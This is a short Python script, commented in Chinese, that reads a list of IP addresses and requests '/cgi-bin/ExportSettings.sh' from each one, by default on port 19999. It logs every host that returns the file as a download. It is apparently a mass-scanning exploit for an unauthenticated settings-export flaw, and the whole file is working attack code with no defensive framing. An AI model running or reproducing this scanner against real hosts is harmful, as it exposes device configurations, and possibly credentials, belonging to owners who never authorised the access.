import requests
import os
import concurrent.futures
import threading


def check_url(ip, success_file):
    if not ip:  # 跳过空IP
        return

    parts = ip.strip().split(':')
    if len(parts) == 1:
        ip = parts[0]
        port = 19999
    elif len(parts) == 2:
        ip, port = parts
    else:
        print(f"Skipping invalid entry: {ip}")
        return

    url = f"http://{ip}:{port}/cgi-bin/ExportSettings.sh"

    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            content_disposition = response.headers.get('content-disposition', '')
            if 'attachment' in content_disposition.lower():
                print(f"\033[91m成功: {url}\033[0m")
                success_url = f"{url}\n"
                with open(success_file, 'a') as f:
                    f.write(success_url)
        else:
            print(f"\033[92m失败: {url}\033[0m")
    except requests.Timeout:
        print(f"\033[92m超时: {url}\033[0m")
    except requests.ConnectionError:
        print(f"\033[92m错误: {url}\033[0m")


def main():
    input_file = 'ip.txt'
    success_file = 'result.txt'

    with open(input_file, 'r') as f:
        ip_list = f.read().splitlines()

    with open(success_file, 'w') as f:  # 清空成功文件
        pass

    with concurrent.futures.ThreadPoolExecutor() as executor:
        threads = []

        for ip in ip_list:
            thread = threading.Thread(target=check_url, args=(ip, success_file))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    print("Finished. Successful URLs written to", success_file)


if __name__ == "__main__":
    main()